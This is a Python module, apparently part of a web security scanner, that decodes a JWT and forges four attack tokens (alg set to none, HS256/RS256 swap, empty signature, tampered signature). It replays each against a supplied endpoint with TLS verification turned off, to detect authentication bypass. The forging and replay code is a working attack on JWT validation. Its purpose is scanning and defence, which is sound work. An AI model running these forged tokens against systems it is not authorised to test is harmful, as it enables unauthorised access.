"""
backend/analysis/jwt_tool.py
────────────────────────────
JWT analysis tool (ported from the Streamlit L1 Automation Main.py).

Decodes a pasted JWT and, when a target endpoint is supplied, forges four
attack tokens and replays each against the endpoint to see whether the server
accepts them:

  • None Algorithm    — header alg set to "none"
  • Algorithm Swap    — HS256 ↔ RS256 confusion
  • Empty Signature   — signature stripped
  • Altered Signature — last 5 chars of the signature flipped

A 2xx response to any forged token means the server did not validate the
signature — a critical auth bypass.
"""

from __future__ import annotations

import base64
import json
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

import httpx

from backend.config import settings
from backend.logger import get_logger

log = get_logger("tools.jwt")


# ─────────────────────────────────────────────────────────
#  Encode / decode helpers
# ─────────────────────────────────────────────────────────

def decode_jwt_part(part: str) -> dict:
    """Base64url-decode one JWT segment into a dict (empty dict on failure)."""
    part += "=" * (-len(part) % 4)   # pad to a multiple of 4
    try:
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return {}


def _b64encode(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _tamper_sig(sig: str) -> str:
    """Replace the last 5 chars of the signature with 'zzzzz' (structurally valid, wrong)."""
    if len(sig) <= 5:
        return "zzzzz"
    return sig[:-5] + "zzzzz"


def _as_int(v) -> int | None:
    try:
        return int(v)
    except (TypeError, ValueError):
        return None


def _ordinal(n: int) -> str:
    """1 → 1st, 2 → 2nd, 3 → 3rd, 23 → 23rd, 24 → 24th …"""
    suffix = "th" if 10 <= n % 100 <= 20 else {1: "st", 2: "nd", 3: "rd"}.get(n % 10, "th")
    return f"{n}{suffix}"


def _utc_date(v) -> str:
    """Format a UNIX timestamp as '24th Jul 2026' in UTC."""
    try:
        d = datetime.fromtimestamp(int(v), tz=timezone.utc)
        return f"{_ordinal(d.day)} {d.strftime('%b')} {d.year}"
    except Exception:
        return str(v)


# ─────────────────────────────────────────────────────────
#  Public entry point
# ─────────────────────────────────────────────────────────

async def analyze_jwt(token: str, target_url: str | None = None) -> dict:
    """
    Decode the token and (if target_url is given) replay four forged tokens.

    Returns a JSON-serialisable dict:
      { valid, header, payload, signature, expiry: {...}, checks: [ ... ] }
    Raises ValueError for a structurally invalid token.
    """
    token = (token or "").strip()
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT — must have exactly 3 parts (header.payload.signature).")

    header  = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    sig     = parts[2]

    # ── Expiry — Vulnerable if the token lifetime (exp − iat) exceeds 2 days ──
    exp = _as_int(payload.get("exp"))
    iat = _as_int(payload.get("iat"))
    two_days = 2 * 86400
    if exp is None:
        vuln = True
        lifetime_days = None
        exp_label = "token never expires"
    elif iat is not None:
        lifetime = exp - iat
        lifetime_days = round(lifetime / 86400)
        vuln = lifetime > two_days
        exp_label = f"Lifetime {lifetime_days} day(s)"
    else:
        # ponytail: no 'iat' to measure issue time — fall back to time remaining from now.
        remaining = exp - int(time.time())
        lifetime_days = round(remaining / 86400)
        vuln = remaining > two_days
        exp_label = f"{lifetime_days} day(s) remaining (no 'iat' claim)"
    expiry = {
        "exp": exp, "iat": iat,
        "exp_human": _utc_date(exp) if exp else "— not set —",
        "iat_human": _utc_date(iat) if iat else "— not set —",
        "lifetime_days": lifetime_days,
        "vulnerable": vuln, "label": exp_label,
        "severity": "info",
    }

    # ── Forge the four attack tokens ──────────────────────
    alg         = str(header.get("alg", "HS256"))
    swapped_alg = "RS256" if alg.upper() == "HS256" else "HS256"

    none_hdr = dict(header); none_hdr["alg"] = "none"
    swap_hdr = dict(header); swap_hdr["alg"] = swapped_alg

    forged = [
        ("None Algorithm",    "critical", "alg=none",             f"{_b64encode(none_hdr)}.{parts[1]}.{sig}"),
        ("Algorithm Swap",    "high",     f"{alg}→{swapped_alg}", f"{_b64encode(swap_hdr)}.{parts[1]}.{sig}"),
        ("Empty Signature",   "high",     "sig stripped",         f"{parts[0]}.{parts[1]}."),
        ("Altered Signature", "high",     "last 5 chars → zzzzz", f"{parts[0]}.{parts[1]}.{_tamper_sig(sig)}"),
    ]

    # ── Replay each forged token (only if an endpoint is supplied) ──
    checks: list[dict] = []
    if target_url and target_url.strip():
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(settings.REQUEST_TIMEOUT),
            follow_redirects=True,
            verify=False,
        ) as client:
            for name, severity, technique, tok in forged:
                check = await _replay(client, target_url.strip(), name, technique, tok)
                check["severity"] = severity
                checks.append(check)
    else:
        for name, severity, technique, tok in forged:
            checks.append({
                "name": name, "technique": technique, "token": tok, "severity": severity,
                "status_code": None, "vulnerable": False,
                "detail": "No endpoint supplied — token forged but not tested.",
            })

    return {
        "valid": True,
        "target_url": (target_url or "").strip(),
        "header": header,
        "payload": payload,
        "signature": sig,
        "algorithm": alg,
        "expiry": expiry,
        "checks": checks,
    }


async def _replay(client: httpx.AsyncClient, url: str, name: str, technique: str, tok: str) -> dict:
    """
    Send one forged token as a Bearer credential.
    VULNERABLE only when the server replies HTTP 200 AND the body is non-empty.
    """
    try:
        r = await client.get(
            url,
            headers={**settings.REQUEST_HEADERS, "Authorization": f"Bearer {tok}"},
        )
        body       = r.text
        vulnerable = (r.status_code == 200 and bool(body.strip()))
        ep   = urlparse(url)
        path = (ep.path or "/") + (("?" + ep.query) if ep.query else "")
        request_data  = (f"GET {path} HTTP/1.1\nHost: {ep.netloc}\n"
                         f"Authorization: Bearer {tok}")
        response_data = (f"HTTP/1.1 {r.status_code} {r.reason_phrase}\n"
                         + "\n".join(f"{k}: {v}" for k, v in list(r.headers.items())[:12])
                         + f"\n\n{body[:2000]}")
        if vulnerable:
            detail = "Server returned HTTP 200 with a body — forged token ACCEPTED (signature not validated)."
        elif r.status_code == 200:
            detail = "HTTP 200 but empty body — not treated as accepted."
        else:
            detail = f"Rejected (HTTP {r.status_code}) — signature validated."
        return {
            "name": name, "technique": technique, "token": tok,
            "status_code": r.status_code, "vulnerable": vulnerable,
            "detail": detail,
            "request_data": request_data, "response_data": response_data,
        }
    except Exception as e:
        return {
            "name": name, "technique": technique, "token": tok,
            "status_code": None, "vulnerable": False,
            "detail": f"Request error: {e}",
        }
